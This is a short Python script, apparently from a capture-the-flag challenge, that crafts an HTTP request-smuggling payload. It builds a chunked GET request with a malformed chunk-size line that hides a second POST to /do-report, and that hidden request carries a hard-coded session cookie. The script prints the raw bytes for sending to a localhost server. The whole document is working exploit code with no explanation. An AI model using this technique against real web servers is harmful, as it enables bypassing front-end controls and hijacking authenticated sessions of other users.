import socket

SESSID = 's%3ATj2N95QEws_6WbTWmgGMe13JsMt8GreS.H2C%2BZzUQq0C9tjNaq8JP%2FlN2HXrpjKejHYNY4s%2FYLC0'

body = b'{"url":"http://example.com"}'

smuggled = (
    b"POST /do-report HTTP/1.1\r\n" +
    b"Host: localhost\r\n" +
    b'Content-Length: ' + str(len(body)).encode() + b"\r\n" +
    b'Cookie: connect.sid=' + SESSID.encode() + b'\r\n' +
    b"Content-Type: application/json\r\n" +
    b'\r\n' +
    body + b"\r\n" +
    b"0\r\n" +
    b"\r\n"
)

def h(n):
    return hex(n)[2:].encode()

smuggled_len = h(len(smuggled) - 7 + 5)

first_chunk_len = h(len(smuggled_len))

print((
    b"GET /index HTTP/1.1\r\n" +
    b"Host: localhost:8080\r\n" +
    b"Transfer-Encoding: chunked\r\n" +
    b"\r\n" +
    first_chunk_len + b" \n" + b"x"*len(smuggled_len) + b"\r\n" +
    smuggled_len + b"\r\n" +
    b"0\r\n" +
    b"\r\n" +
    smuggled
).decode())
